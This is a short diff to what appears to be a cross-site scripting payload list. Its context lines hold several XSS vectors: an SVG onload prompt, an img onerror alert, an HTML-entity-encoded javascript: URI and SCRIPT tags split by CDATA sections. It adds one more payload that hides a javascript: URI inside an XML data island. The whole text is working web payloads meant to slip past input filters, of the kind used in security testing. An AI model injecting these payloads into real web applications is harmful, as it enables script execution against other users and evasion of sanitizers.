@@ -9,3 +9,4 @@ a"><svg/onload=prompt(1)>
 "\u003e\u003cimg src=1 onerror=alert(0)\u003e
 %26%2302java%26%23115cript:alert(document.domain)
 <![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>"
